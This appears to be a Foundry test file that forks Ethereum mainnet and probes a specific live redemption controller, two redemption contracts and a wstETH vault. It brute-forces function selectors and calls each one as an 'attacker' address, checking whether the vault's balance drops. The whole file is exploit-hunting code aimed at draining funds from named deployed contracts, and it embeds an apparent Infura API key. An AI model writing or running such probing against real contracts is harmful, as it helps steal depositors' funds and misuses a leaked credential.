// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract RCSuccessfulSelectors is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeSuccessfulRCSelectors() public view {
        console.log("=== ANALYZING SUCCESSFUL RC SELECTORS ===\n");

        // Selectors that succeeded:
        // 0x9fd0506d, 0xa5956078, 0x411557d1

        console.log("Testing 0x9fd0506d:");
        (bool s1, bytes memory d1) = REDEMPTION_CONTROLLER.staticcall(
            abi.encodeWithSelector(bytes4(0x9fd0506d))
        );
        console.log("Success:", s1);
        if (s1 && d1.length == 32) {
            console.log("Returns uint:", abi.decode(d1, (uint256)));
            console.log("As address:", abi.decode(d1, (address)));
        }

        console.log("\nTesting 0xa5956078:");
        (bool s2, bytes memory d2) = REDEMPTION_CONTROLLER.staticcall(
            abi.encodeWithSelector(bytes4(0xa5956078))
        );
        console.log("Success:", s2);
        if (s2 && d2.length == 32) {
            console.log("Returns uint:", abi.decode(d2, (uint256)));
            console.log("As address:", abi.decode(d2, (address)));
        }

        console.log("\nTesting 0x411557d1:");
        (bool s3, bytes memory d3) = REDEMPTION_CONTROLLER.staticcall(
            abi.encodeWithSelector(bytes4(0x411557d1))
        );
        console.log("Success:", s3);
        if (s3 && d3.length == 32) {
            console.log("Returns uint:", abi.decode(d3, (uint256)));
            console.log("As address:", abi.decode(d3, (address)));
        }
    }

    function test_MatchMoreRCSelectors() public pure {
        console.log("=== MATCHING MORE RC SELECTORS ===\n");

        bytes4[] memory targets = new bytes4[](20);
        targets[0] = bytes4(0x578063c5);
        targets[1] = bytes4(0xc5d664c6);
        targets[2] = bytes4(0xe30c3978);
        targets[3] = bytes4(0xf2fde38b);
        targets[4] = bytes4(0xb2118a8d);
        targets[5] = bytes4(0xbedb86fb);
        targets[6] = bytes4(0x93d5f4c5);
        targets[7] = bytes4(0x9fd0506d);
        targets[8] = bytes4(0xa5956078);
        targets[9] = bytes4(0x7bde82f2);
        targets[10] = bytes4(0x8da5cb5b);
        targets[11] = bytes4(0x5c975abb);
        targets[12] = bytes4(0x715018a6);
        targets[13] = bytes4(0x79ba5097);
        targets[14] = bytes4(0x38a63183);
        targets[15] = bytes4(0x411557d1);
        targets[16] = bytes4(0x04824e70);
        targets[17] = bytes4(0x1fe923d3);
        targets[18] = bytes4(0x2ab60045);
        targets[19] = bytes4(0x2d88af4a);

        string[60] memory funcs = [
            "owner()",
            "pendingOwner()",
            "transferOwnership(address)",
            "acceptOwnership()",
            "renounceOwnership()",
            "paused()",
            "pause()",
            "unpause()",
            "vault()",
            "getVault()",
            "asset()",
            "getAsset()",
            "wstETH()",
            "redemption()",
            "redemptions(uint256)",
            "redemptions(address)",
            "redemptionCount()",
            "getRedemptionCount()",
            "addRedemption(address)",
            "removeRedemption(address)",
            "setRedemption(address)",
            "isRedemption(address)",
            "registered(address)",
            "redeem(uint256,address)",
            "redeem(uint256)",
            "claim(uint256)",
            "claim(uint256,address)",
            "withdraw(uint256)",
            "withdraw(uint256,address)",
            "deposit(uint256)",
            "initialize(address)",
            "initialize(address,address)",
            "setVault(address)",
            "setAsset(address)",
            "setPaused(bool)",
            "setFee(uint256)",
            "fee()",
            "feeRecipient()",
            "setFeeRecipient(address)",
            "execute(address,bytes)",
            "multicall(bytes[])",
            "emergencyWithdraw()",
            "emergencyWithdraw(address)",
            "rescue(address)",
            "sweep(address)",
            "implementation()",
            "getImplementation()",
            "upgradeToAndCall(address,bytes)",
            "upgradeTo(address)",
            "proxiableUUID()",
            "UPGRADE_INTERFACE_VERSION()",
            "totalRedeemed()",
            "totalRedemptions()",
            "claimProxy(address)",
            "getClaimProxy(address)",
            "deployClaimProxy()",
            "createClaimProxy()",
            "deployRedemption()",
            "createRedemption()",
            "registry()"
        ];

        for (uint t = 0; t < 20; t++) {
            bool found = false;
            for (uint f = 0; f < 60; f++) {
                bytes4 sel = bytes4(keccak256(bytes(funcs[f])));
                if (sel == targets[t]) {
                    console.log("Selector:");
                    console.logBytes4(targets[t]);
                    console.log("  MATCH:", funcs[f]);
                    found = true;
                    break;
                }
            }
            if (!found) {
                console.log("Unknown:");
                console.logBytes4(targets[t]);
            }
        }
    }

    function test_TryAllRCSelectorsWithParams() public {
        console.log("=== TRYING ALL RC SELECTORS WITH VARIOUS PARAMS ===\n");

        bytes4[] memory sels = new bytes4[](20);
        sels[0] = bytes4(0x578063c5);
        sels[1] = bytes4(0xc5d664c6);
        sels[2] = bytes4(0xe30c3978);
        sels[3] = bytes4(0xf2fde38b);
        sels[4] = bytes4(0xb2118a8d);
        sels[5] = bytes4(0xbedb86fb);
        sels[6] = bytes4(0x93d5f4c5);
        sels[7] = bytes4(0x9fd0506d);
        sels[8] = bytes4(0xa5956078);
        sels[9] = bytes4(0x7bde82f2);
        sels[10] = bytes4(0x8da5cb5b);
        sels[11] = bytes4(0x5c975abb);
        sels[12] = bytes4(0x715018a6);
        sels[13] = bytes4(0x79ba5097);
        sels[14] = bytes4(0x38a63183);
        sels[15] = bytes4(0x411557d1);
        sels[16] = bytes4(0x04824e70);
        sels[17] = bytes4(0x1fe923d3);
        sels[18] = bytes4(0x2ab60045);
        sels[19] = bytes4(0x2d88af4a);

        vm.startPrank(attacker);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        console.log("Testing with various params:");
        for (uint i = 0; i < 20; i++) {
            // Skip known view functions
            if (sels[i] == bytes4(0x8da5cb5b) || // owner()
                sels[i] == bytes4(0xe30c3978) || // pendingOwner()
                sels[i] == bytes4(0x5c975abb) || // paused()
                sels[i] == bytes4(0x411557d1) || // vault()
                sels[i] == bytes4(0xc5d664c6) || // asset()
                sels[i] == bytes4(0x9fd0506d) || // unknown getter
                sels[i] == bytes4(0xa5956078) || // unknown getter
                sels[i] == bytes4(0x38a63183)) { // unknown getter
                continue;
            }

            // Try with (uint256, address) - like redeem
            (bool s1, bytes memory d1) = REDEMPTION_CONTROLLER.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], uint256(100e18), attacker)
            );
            if (s1) {
                console.log("SUCCESS (uint,addr):");
                console.logBytes4(sels[i]);
            } else if (d1.length >= 4) {
                // Check error
                bytes4 err = bytes4(d1);
                if (err != bytes4(keccak256("NotRedemption()"))) {
                    console.log("Selector", i, "error:");
                    console.logBytes4(err);
                }
            }

            // Try with just address
            (bool s2,) = REDEMPTION_CONTROLLER.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], attacker)
            );
            if (s2) {
                console.log("SUCCESS (addr):");
                console.logBytes4(sels[i]);
            }

            // Try with bytes32 (salt-like)
            (bool s3,) = REDEMPTION_CONTROLLER.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], bytes32(uint256(uint160(attacker))))
            );
            if (s3) {
                console.log("SUCCESS (bytes32):");
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", attackerWstETH);
    }

    function test_ExploreFunctionB2118a8d() public {
        console.log("=== EXPLORING 0xb2118a8d ===\n");

        // This selector appears in both R0 and RC
        // Might be related to redemption management

        console.log("Calling on R0:");
        (bool s1, bytes memory d1) = REDEMPTION_0.staticcall(
            abi.encodeWithSelector(bytes4(0xb2118a8d))
        );
        console.log("Success:", s1);
        if (s1 && d1.length >= 32) {
            console.log("Returns:", abi.decode(d1, (uint256)));
        }

        console.log("\nCalling on R1:");
        (bool s2, bytes memory d2) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(bytes4(0xb2118a8d))
        );
        console.log("Success:", s2);
        if (s2 && d2.length >= 32) {
            console.log("Returns:", abi.decode(d2, (uint256)));
        }

        console.log("\nCalling on RC:");
        (bool s3, bytes memory d3) = REDEMPTION_CONTROLLER.staticcall(
            abi.encodeWithSelector(bytes4(0xb2118a8d))
        );
        console.log("Success:", s3);
        if (s3 && d3.length >= 32) {
            console.log("Returns:", abi.decode(d3, (uint256)));
        }

        // Try with params
        console.log("\nCalling 0xb2118a8d(attacker) on R0:");
        (bool s4, bytes memory d4) = REDEMPTION_0.staticcall(
            abi.encodeWithSelector(bytes4(0xb2118a8d), attacker)
        );
        console.log("Success:", s4);
        if (s4 && d4.length >= 32) {
            console.log("Returns:", abi.decode(d4, (uint256)));
        }
    }
}
